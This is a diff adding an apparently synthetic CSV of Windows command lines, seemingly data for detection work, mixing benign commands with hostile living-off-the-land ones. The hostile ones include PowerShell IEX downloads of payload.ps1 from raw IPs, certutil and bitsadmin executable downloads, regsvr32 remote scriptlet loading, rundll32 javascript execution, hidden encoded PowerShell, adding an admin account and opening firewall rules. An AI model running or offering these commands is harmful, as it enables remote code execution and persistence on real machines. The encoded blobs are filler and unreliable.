@@ -1,0 +1,101 @@
+command_line
+cmd.exe /c type C:\file_1409.txt
+C:\Windows\System32\notepad.exe C:\file7482.txt
+"wmic product get name,version"
+"powershell.exe IEX (New-Object Net.WebClient).DownloadString(""http://129.236.219.136/payload.ps1"")"
+"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write()"
+"wmic product get name,version"
+"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write()"
+powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand txKnwH1+HBUs+ZuEsoGy3nH/yWbYgW31G+p1tcv+R0ifcvR31F5PenYB3LNzW5tR
+powershell.exe -ExecutionPolicy Bypass -File C:\Temp\script_9464.ps1
+"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write()"
+powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand DhogcDRIS5fBozuUAaO2H9qK8StbfedJMmwIEy3WzRAv2lq4dfVxY84/PY3aUe7Y
+"wmic process call create ""notepad.exe"""
+certutil.exe -decode C:\encoded6881.txt C:\decoded.exe
+net.exe user
+cmd.exe /c dir C:\Users\Administrator\Documents
+"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write()"
+"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write()"
+certutil.exe -urlcache -split -f http://105.199.87.174/file7108.exe C:\Temp\file.exe
+regsvr32.exe /s /u /i:http://129.136.108.248/script.sct scrobj.dll
+"C:\Windows\explorer.exe /select,C:\Users\Administrator\Desktop\file1333.pdf"
+cmd.exe /c whoami
+cmd.exe /c whoami
+"wmic process where name=""explorer.exe"" get commandline"
+"C:\Program Files\Microsoft Office\Office16\WINWORD.EXE /n ""C:\Users\User\Documents\doc5350.docx"""
+"powershell.exe IEX (New-Object Net.WebClient).DownloadString(""http://14.26.106.85/payload.ps1"")"
+powershell.exe -ExecutionPolicy Bypass -File C:\Temp\script_5285.ps1
+regsvr32.exe /s /u /i:http://168.221.90.31/script.sct scrobj.dll
+"wmic process call create ""notepad.exe"""
+"wmic process where name=""explorer.exe"" get commandline"
+powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand k3sjYwzsFwWGPEnnm+VpydOjYMmYyTQERYyKZXF9cxGFckhGFkmy4Aayvk=PhsLR
+schtasks.exe /query /fo LIST /v
+cmd.exe /c dir C:\Users\Guest\Documents
+certutil.exe -decode C:\encoded7431.txt C:\decoded.exe
+"netsh.exe advfirewall firewall add rule name=""Rule8015"" dir=in action=allow"
+cmd.exe /c echo 03921fb9-0e7f-0738-1d45-0065e89e8218 > C:\Temp\output_5945.txt
+reg.exe delete HKLM\Software\Temp9185 /f
+C:\Windows\System32\notepad.exe C:\file3734.txt
+certutil.exe -urlcache -split -f http://130.35.164.210/file8511.exe C:\Temp\file.exe
+"powershell.exe IEX (New-Object Net.WebClient).DownloadString(""http://211.186.102.128/payload.ps1"")"
+net.exe user
+"powershell.exe IEX (New-Object Net.WebClient).DownloadString(""http://249.43.227.106/payload.ps1"")"
+"wmic process call create ""notepad.exe"""
+reg.exe delete HKLM\Software\Temp1807 /f
+powershell.exe -ExecutionPolicy Bypass -File C:\Temp\script_4666.ps1
+certutil.exe -urlcache -split -f http://218.31.121.14/file5269.exe C:\Temp\file.exe
+cmd.exe /c echo 00e51bb2-1beb-1446-2621-0023e7fcaadd > C:\Temp\output_4460.txt
+net.exe use \\225.188.24.96\share /user:domain\user6857
+regsvr32.exe /s /u /i:http://81.31.252.128/script.sct scrobj.dll
+net.exe group administrators
+"powershell.exe IEX (New-Object Net.WebClient).DownloadString(""http://159.223.200.221/payload.ps1"")"
+C:\Windows\System32\notepad.exe C:\file1718.txt
+cmd.exe /c net user admin5992 P@ssw0rd225 /add
+"wmic process call create ""notepad.exe"""
+"rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL C:\Windows\System32\intl.cpl"
+schtasks.exe /delete /tn Task9908 /f
+"wmic process where name=""explorer.exe"" get commandline"
+"wmic product get name,version"
+"powershell.exe IEX (New-Object Net.WebClient).DownloadString(""http://16.56.209.66/payload.ps1"")"
+regsvr32.exe /s /u /i:http://8.9.170.92/script.sct scrobj.dll
+schtasks.exe /delete /tn Task5410 /f
+cmd.exe /c dir C:\Users\Guest\Documents
+"rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL C:\Windows\System32\intl.cpl"
+net.exe user
+regsvr32.exe /s /u /i:http://52.176.96.40/script.sct scrobj.dll
+"powershell.exe -Command ""Get-Process | Where-Object {$_.CPU -gt 240}"""
+reg.exe add HKLM\Software\Test2083 /v Value191 /t REG_SZ /d data
+"wmic process call create ""notepad.exe"""
+schtasks.exe /delete /tn Task7996 /f
+net.exe user
+"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write()"
+"powershell.exe IEX (New-Object Net.WebClient).DownloadString(""http://194.38.170.39/payload.ps1"")"
+"C:\Windows\explorer.exe /select,C:\Users\Guest\Desktop\file5411.pdf"
+C:\Windows\System32\notepad.exe C:\file7765.txt
+cmd.exe /c type C:\file_4018.txt
+certutil.exe -decode C:\encoded2749.txt C:\decoded.exe
+powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand q5b0ytNpia8nCLg9oyWAPHiGXxjOyqRMzs+eLrCpScV0xCw8LzfH6umVMrVyVGv4
+certutil.exe -decode C:\encoded4615.txt C:\decoded.exe
+cmd.exe /c echo 059d4eff-086e-1c89-1936-001fd0614d1b > C:\Temp\output_7641.txt
+"powershell.exe -Command ""Get-Process | Where-Object {$_.CPU -gt 436}"""
+regsvr32.exe /s /u /i:http://231.11.36.174/script.sct scrobj.dll
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Temp\build4678.xml
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Temp\build2251.xml
+net.exe group administrators
+C:\Program Files\Mozilla Firefox\firefox.exe -url http://example9064.com
+net.exe group administrators
+bitsadmin.exe /transfer job4907 http://8.63.205.212/file.exe C:\Temp\downloaded.exe
+"powershell.exe IEX (New-Object Net.WebClient).DownloadString(""http://80.164.246.180/payload.ps1"")"
+reg.exe query HKCU\Software\Microsoft\Windows
+net.exe use \\182.136.111.37\share /user:domain\user8669
+schtasks.exe /query /fo LIST /v
+"netsh.exe advfirewall firewall add rule name=""Rule5175"" dir=in action=allow"
+C:\Windows\System32\notepad.exe C:\file5764.txt
+"C:\Windows\explorer.exe /select,C:\Users\User7\Desktop\file2706.pdf"
+C:\Program Files\Mozilla Firefox\firefox.exe -url http://example3406.com
+schtasks.exe /create /tn Task9172 /tr C:\Windows\System32\calc.exe /sc daily
+cmd.exe /c type C:\file_2395.txt
+"wmic process where name=""explorer.exe"" get commandline"
+"netsh.exe advfirewall firewall add rule name=""Rule4137"" dir=in action=allow"
+schtasks.exe /create /tn Task5049 /tr C:\Windows\System32\calc.exe /sc daily
+"powershell.exe IEX (New-Object Net.WebClient).DownloadString(""http://109.89.51.250/payload.ps1"")"
